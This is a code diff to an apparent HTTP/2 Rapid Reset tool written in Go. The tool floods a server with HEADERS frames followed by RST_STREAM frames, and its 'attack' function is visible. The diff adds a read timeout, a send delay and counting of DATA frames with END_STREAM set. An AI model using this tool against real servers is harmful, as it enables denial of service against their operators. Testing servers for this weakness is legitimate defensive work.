@@ -36,6 +36,7 @@ type ResultData struct {
 	Ping         uint32
 	Unknown      uint32
 	RSTStream    uint32
+	DataEndStream uint32
 }
 
 type ReadFrameResult struct {
@@ -60,6 +61,7 @@ func (rd *ResultData) Add(data ResultData) {
 	rd.Ping += data.Ping
 	rd.Unknown += data.Unknown
 	rd.RSTStream += data.RSTStream
+	rd.DataEndStream += data.DataEndStream
 }
 
 func (rfr *ReadFrameResult) Add(result ReadFrameResult) {
@@ -91,6 +93,8 @@ var monitoringEnabled = flag.Bool("monitor", false, "enable performance monitori
 var monitorLogPath = flag.String("monitorLog", "monitor.log", "path to performance monitor logfile")
 var connectAttempts = flag.Uint("connectAttempts", 1, "number of consecutive connections to run the test on (per connect-routine)")
 var consecutiveSends = flag.Uint("consecutiveSends", 1, "number of HEADERS frames to send before sending RST_STREAM frames (per flow)")
+var timeout = flag.Uint("timeout", 1000, "time in ms to wait for more frames before terminating the connection")
+var connTotal uint;
 
 func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
 	var headerBlock bytes.Buffer
@@ -102,7 +106,6 @@ func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFramePar
 	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: url.Path})
 	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
 	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: url.Host})
-	log.Printf("path: %s\nHost: %s", url.Path, url.Host)
 
 	return http2.HeadersFrameParam{
 		StreamID:      streamId,
@@ -172,6 +175,7 @@ func main() {
 		os.Exit(0)
 	}
 
+	connTotal = *flows
 	*flows = uint(math.Ceil(float64(*flows) / float64(*consecutiveSends) / float64(*routines)))
 	log.Printf("each routine will send execute %d flows, sending %d HEADERS frames consecutively on %d routines", *flows, *consecutiveSends, *routines)
 
@@ -222,6 +226,7 @@ func summarize(ch <-chan ReadFrameResult) {
 	fmt.Printf("\tHEADERS: %d\n", summary.Headers)
 	fmt.Printf("\tSETTINGS: %d\n", summary.Settings)
 	fmt.Printf("\tDATA: %d\n", summary.Data)
+	fmt.Printf("\tDATA (END STREAM flag set): %d", summary.DataEndStream)
 	fmt.Printf("\tGOAWAY: %d\n", summary.GoAway)
 	fmt.Printf("\tRSTSTREAM: %d\n", summary.RSTStream)
 	fmt.Printf("\tWINDOWUPDATE: %d\n", summary.WindowUpdate)
@@ -242,6 +247,7 @@ func printResult(result ReadFrameResult) {
 	fmt.Printf("\tRSTSTREAM: %d\n", result.RSTStream)
 	fmt.Printf("\tWINDOWUPDATE: %d\n", result.WindowUpdate)
 	fmt.Printf("\tUNKNOWN: %d\n", result.Unknown)
+	fmt.Printf("\tDATA (END STREAM flag set): %d", result.DataEndStream)
 
 	var reason string
 	switch result.Err {
@@ -320,11 +326,14 @@ func readFrames(conn *tls.Conn, connId uint) ReadFrameResult {
 		Conn: connId,
 	}
 
-	readDuration := 1 * time.Second
+	readDuration := time.Duration(*timeout) * time.Millisecond
 	for {
-		conn.SetReadDeadline(time.Now().Add(readDuration))
+		if *timeout > 0 {
+			conn.SetReadDeadline(time.Now().Add(readDuration))
+		}
+		
 		frame, err := framer.ReadFrame()
-		if err != nil {
+		if err != nil{
 			log.Printf("error reading response frame: %v", err)
 			if rfr.Err == UNKNOWN {
 				rfr.Err = ERR
@@ -339,6 +348,9 @@ func readFrames(conn *tls.Conn, connId uint) ReadFrameResult {
 			rfr.Settings++
 		case http2.FrameData:
 			rfr.Data++
+			if frame.Header().Flags.Has(http2.FlagDataEndStream) {
+				rfr.DataEndStream++
+			}	
 		case http2.FrameGoAway:
 			rfr.GoAway++
 			rfr.Err = GOAWAY
@@ -353,6 +365,10 @@ func readFrames(conn *tls.Conn, connId uint) ReadFrameResult {
 			rfr.WindowUpdate++
 		default:
 			rfr.Unknown++
+		}
+
+		if rfr.DataEndStream == uint32(connTotal) {
+			return rfr
 		}
 	}
 }
@@ -378,6 +394,10 @@ func attack(framer *http2.Framer, url *url.URL, streamCounter *uint32, lock *syn
 				log.Printf("[stream %d] unable to send initial HEADERS frame", hp.StreamID)
 				return
 			}
+		}
+
+		if *sleep > 0 {
+			time.Sleep(time.Duration(*sleep) * time.Millisecond)
 		}
 
 		for _, v := range(opened) {
